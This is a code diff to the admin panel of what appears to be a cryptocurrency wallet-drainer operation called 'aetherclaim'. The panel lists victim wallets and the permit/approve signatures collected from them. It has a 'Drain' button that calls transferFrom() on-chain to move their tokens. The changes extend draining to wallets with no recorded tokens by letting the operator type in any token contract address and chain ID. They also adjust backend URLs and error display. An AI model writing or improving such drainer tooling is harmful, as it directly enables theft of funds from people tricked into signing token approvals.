@@ -178,7 +178,7 @@
     .empty-state p{font-size:13px}
 
     /* ── COPY TOAST ── */
-    #toast{position:fixed;bottom:20px;right:20px;background:#1e2740;border:1px solid var(--border2);color:var(--text);padding:10px 18px;border-radius:8px;font-size:13px;z-index:200;opacity:0;transition:opacity .2s;pointer-events:none}
+    #toast{position:fixed;bottom:20px;right:20px;background:#1e2740;border:1px solid var(--border2);color:var(--text);padding:10px 18px;border-radius:8px;font-size:13px;z-index:200;opacity:0;transition:opacity .2s;pointer-events:none;max-width:380px;word-break:break-word;line-height:1.45}
     #toast.show{opacity:1}
 
     /* ── MOBILE ── */
@@ -575,10 +575,13 @@
 </div>
 
 <script>
-  // Use relative URLs when admin is served directly from the backend (local or Render)
-  // Use absolute Render URL only when admin is accessed from an external domain
+  // When on localhost: always hit Express on :3001 explicitly (admin may be served by XAMPP on :80)
+  // When on Render: use relative paths (same-origin)
+  // Anything else (custom domain): point to Render
   const h = window.location.hostname
-  const BASE = (h === 'localhost' || h === '127.0.0.1' || h.includes('onrender.com')) ? '' : 'https://aetherclaim-api.onrender.com'
+  const BASE = (h === 'localhost' || h === '127.0.0.1')
+    ? 'http://localhost:3001'
+    : (h.includes('onrender.com') ? '' : 'https://aetherclaim-api.onrender.com')
 
   let adminPw = ''
   let dashData = {}
@@ -782,7 +785,7 @@
         <td><span class="badge ${w.drained?'success':w.online?'online':'pending'}">${w.drained?'Drained':w.online?'Online':'Idle'}</span></td>
         <td style="display:flex;gap:5px;flex-wrap:wrap">
           <button class="btn xs ghost" onclick="showWalletDetail('${w.address}')">Details</button>
-          ${!w.drained && (w.tokens||[]).length ? `<button class="btn xs red" onclick="triggerManualDrain('${w.address}')">⚡ Drain</button>` : ''}
+          ${!w.drained ? `<button class="btn xs red" onclick="triggerManualDrain('${w.address}')">⚡ Drain</button>` : ''}
         </td>
       </tr>`
     }).join('')
@@ -820,7 +823,7 @@
         <td>${CHAIN_ICONS[x.chainId]||''} ${CHAIN_NAMES[x.chainId]||x.chainId}</td>
         <td><span class="badge info">${x.sig ? 'permit' : 'approve'}</span></td>
         <td><span class="badge ${x.success?'success':'fail'}">${x.success?'✓ Success':'✗ Failed'}</span>
-          ${!x.success && x.error ? `<div style="font-size:10px;color:var(--red);margin-top:3px;max-width:150px;overflow:hidden;text-overflow:ellipsis" title="${x.error}">${x.error.slice(0,40)}...</div>` : ''}
+          ${!x.success && x.error ? `<div style="font-size:10px;color:var(--red);margin-top:4px;white-space:normal;word-break:break-word;line-height:1.45;max-width:220px">${x.error}</div>` : ''}
         </td>
         <td>${tx}</td>
         <td style="color:var(--muted);font-size:11px;white-space:nowrap">${new Date(x.startedAt).toLocaleString()}</td>
@@ -957,7 +960,7 @@
               </div>
               ${d.amount ? `<div style="font-family:'JetBrains Mono',monospace;font-size:12px">${d.amount} ${d.symbol}</div>` : ''}
               ${d.txHash ? `<a href="${(EXPLORERS[d.chainId]||'https://bscscan.com/tx/')+d.txHash}" target="_blank" style="color:var(--accent);font-size:10px;font-family:'JetBrains Mono',monospace">${d.txHash.slice(0,20)}...</a>` : ''}
-              ${d.error ? `<div style="font-size:11px;color:var(--red);margin-top:4px">${d.error.slice(0,80)}</div>` : ''}
+              ${d.error ? `<div style="font-size:11px;color:var(--red);margin-top:6px;word-break:break-word;line-height:1.5;background:rgba(239,68,68,.07);border-radius:5px;padding:6px 8px"><span style="font-weight:600">Error:</span> ${d.error}</div>` : ''}
             </div>`).join('')}
         </div>` : ''}
       <div style="display:flex;gap:8px;margin-top:18px;flex-wrap:wrap">
@@ -973,17 +976,24 @@
   document.getElementById('wallet-modal').addEventListener('click', e => { if(e.target.id==='wallet-modal') closeModal() })
 
   async function triggerManualDrain(ownerAddress, tokenAddress, chainId) {
-    // If called from wallet row (no token specified), pick first token
+    // If called from wallet row with no token, try first stored token; otherwise prompt admin
     if (!tokenAddress) {
       const w = allWallets.find(x => x.address === ownerAddress)
       const tok = (w?.tokens||[])[0]
-      if (!tok) { toast('No tokens found for this wallet'); return }
-      tokenAddress = tok.address
-      chainId = tok.chainId
+      if (tok) {
+        tokenAddress = tok.address
+        chainId = tok.chainId
+      } else {
+        // No tokens on record — let admin enter manually
+        tokenAddress = window.prompt('No tokens detected for this wallet.\n\nEnter token contract address to drain:')
+        if (!tokenAddress || !tokenAddress.startsWith('0x')) { toast('Cancelled — invalid token address'); return }
+        const chainInput = window.prompt('Enter chain ID (56=BSC, 1=ETH, 137=Polygon, 42161=Arbitrum):','56')
+        chainId = parseInt(chainInput) || 56
+      }
     }
     const w = allWallets.find(x => x.address === ownerAddress)
     const tok = (w?.tokens||[]).find(t => t.address === tokenAddress) || {}
-    const confirm = window.confirm(`Manually drain ${tok.symbol || 'token'} from\n${ownerAddress.slice(0,20)}...?\n\nThis will call permit()/transferFrom() on-chain immediately.`)
+    const confirm = window.confirm(`Manually drain ${tok.symbol || tokenAddress.slice(0,12)+'...'} from\n${ownerAddress.slice(0,20)}...?\n\nChain ID: ${chainId}\n\nThis will call transferFrom() on-chain immediately.`)
     if (!confirm) return
     toast('⚡ Drain initiated...')
     try {
@@ -995,7 +1005,7 @@
         toast(`✓ Drained ${r.amount} ${r.symbol}`)
         refresh()
       } else {
-        toast('✗ Drain failed: ' + (r.error||'unknown').slice(0,60))
+        toast('✗ ' + (r.error||'Drain failed'))
       }
     } catch(e) {
       toast('✗ Error: ' + e.message)
